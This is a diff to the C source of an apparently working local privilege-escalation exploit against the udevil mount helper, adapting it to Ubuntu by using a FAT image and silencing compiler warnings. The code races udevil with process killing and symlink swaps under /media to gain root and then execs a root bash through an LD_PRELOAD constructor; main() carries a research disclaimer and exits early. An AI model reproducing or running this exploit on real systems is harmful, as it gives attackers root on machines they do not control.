@@ -1,7 +1,7 @@
 #if POLYGLOT
 
 set -x
-cc -fPIC -c -pedantic -Wall -std=c11 $0 -o youdevil.o
+cc -fPIC -c -O2 -pedantic -Wall -std=c11 $0 -o youdevil.o
 cc -shared youdevil.o -o youdevil
 YOUDEVIL=1 LD_PRELOAD=./youdevil cat
 exit
@@ -77,8 +77,10 @@ void __attribute__((constructor)) _boomsh()
 
 	char *sh[] = {"/bin/bash", NULL};
 
-	setuid(0);
-	setgid(0);
+	if (setuid(0) < 0)
+		;
+	if (setgid(0) < 0)
+		;
 
 	printf("[?] Boomsh! euid=%d\n", geteuid());
 	execve(*sh, sh, NULL);
@@ -90,7 +92,7 @@ int create_dir(const char *user)
 {
 	struct stat st;
 	char media[256] = {0}, ramfs[256] = {0}, commpath[256] = {0}, comm[32] = {0};
-	char *mount[] = {"/usr/bin/udevil", "mount", "ramfs", NULL};
+	char *mount[] = {"/usr/bin/udevil", "mount", "ramfs", ramfs, NULL};	// will make udevil fail, but create dir
 	char *umount[] = {"/usr/bin/udevil", "umount", ramfs, NULL};
 	pid_t pid = 0;
 	char done = 0;
@@ -101,7 +103,8 @@ int create_dir(const char *user)
 	printf("[*] Creating user-owned `%s` ...\n", media);
 
 	// warm FS cache
-	mkdir(media, 0700);
+	if (mkdir(media, 0700) < 0)
+		;
 
 	// Not really a for-loop. We just have one try to make the "setfacl" invocation
 	// fail and fallback to a chown(). But with the sched_yield() in place there
@@ -122,7 +125,8 @@ int create_dir(const char *user)
 			snprintf(commpath, sizeof(commpath) - 1, "/proc/%d/comm", pid + range);
 			int fd = open(commpath, O_RDONLY);
 			if (fd >= 0) {
-				read(fd, comm, sizeof(comm) - 1);
+				if (read(fd, comm, sizeof(comm) - 1) < 0)
+					;
 				if (strncmp(comm, "setfacl", 7) == 0) {
 					kill(pid + range, SIGKILL);
 					done = 1;
@@ -162,24 +166,34 @@ int create_symlink(const char *user)
 {
 	struct stat st;
 
-	char media[256] = {0}, ramfs[256] = {0};
-	char *mount[] = {"/usr/bin/udevil", "mount", "ramfs", ramfs, NULL};
-	char *umount[] = {"/usr/bin/udevil", "umount", ramfs, NULL};
+	char media[256] = {0}, fatfs[256] = {0};
+	char *mount[] = {"/usr/bin/udevil", "mount", "fat.img", fatfs, NULL};
+	char *umount[] = {"/usr/bin/udevil", "umount", fatfs, NULL};
 	pid_t pid = 0, executor_pid = 0;
 
 	snprintf(media, sizeof(media) - 1, "/media/%s", user);
-	snprintf(ramfs, sizeof(ramfs) - 1, "/media/%s/ramfs", user);
+	snprintf(fatfs, sizeof(fatfs) - 1, "/media/%s/fatfs", user);
 
-	printf("[*] Entering executor-loop. Not using inotify so this can take some minutes ...\n");
+	if (chdir(media) < 0)
+		;
+
+	// Ubuntu's udevil has a problem with "ramfs" vs "none" mounts, so it needs real file
+	printf("[*] Setting up fat img for mounting ...\n\n");
+	if (system("dd if=/dev/zero of=fat.img bs=4096 count=1000; mkfs.vfat fat.img") < 0)
+		;
+
+	printf("\n[*] Entering executor-loop. This can take some minutes ...\n");
 
 	if ((executor_pid = fork()) == 0) {
 		close(0); close(1); close(2);
-		open("/dev/null", O_RDWR);
-		dup2(0, 1); dup2(1, 2);
+		if (open("/dev/null", O_RDWR) == 0) {
+			dup2(0, 1); dup2(1, 2);
+		}
 
 		for (;;) {
 			pid_t pid = 0;
 			if ((pid = fork()) == 0) {
+				//nice(5);
 				execve(*mount, mount, NULL);
 				exit(1);
 			}
@@ -195,18 +209,18 @@ int create_symlink(const char *user)
 		}
 	}
 
-	chdir(media);
-
 	pid = getpid();
 	fork(); fork(); fork(); fork();
 
 	// The udevil code is more robust than you'd think first.
 	// Thats the only bug I found.
 	for (;;) {
-		unlink("ramfs/.udevil-mount-point");
-		if (rmdir("ramfs") == 0) {
-			mkdir("ramfs", 0755);
-			symlink(target, "ramfs/.udevil-mount-point");
+		unlink("fatfs/.udevil-mount-point");
+		if (rmdir("fatfs") == 0) {
+			if (mkdir("fatfs", 0755) < 0)
+				;
+			if (symlink(target, "fatfs/.udevil-mount-point") < 0)
+				;
 		}
 		if (stat(target, &st) == 0)
 			break;
@@ -231,7 +245,8 @@ void boomsh(const char *user)
 
 	char me[1024] = {0};
 	snprintf(me, sizeof(me) - 1, "%s/youdevil", cwd);
-	write(fd, me, strlen(me));
+	if (write(fd, me, strlen(me)) < 0)
+		;
 	close(fd);
 
 	char *a[] = {"/usr/bin/udevil", NULL}, *e[] = {"BOOMSH=1", NULL};
@@ -260,12 +275,15 @@ void banner()
 
 int main(int argc, char **argv)
 {
+	unsetenv("LD_PRELOAD");
+
 	banner();
 	printf("\n\n!!! Disclaimer: For research purposes only !!!\n!!! Make sure to only run in safe testing environments !!!\n");
 	exit(0);
 
 	umask(0);
-	getcwd(cwd, sizeof(cwd) - 1);
+	if (!getcwd(cwd, sizeof(cwd) - 1))
+		;
 
 	printf("\n[!] Get the real deal at https://github.com/stealth/polyglots\n\n");
 
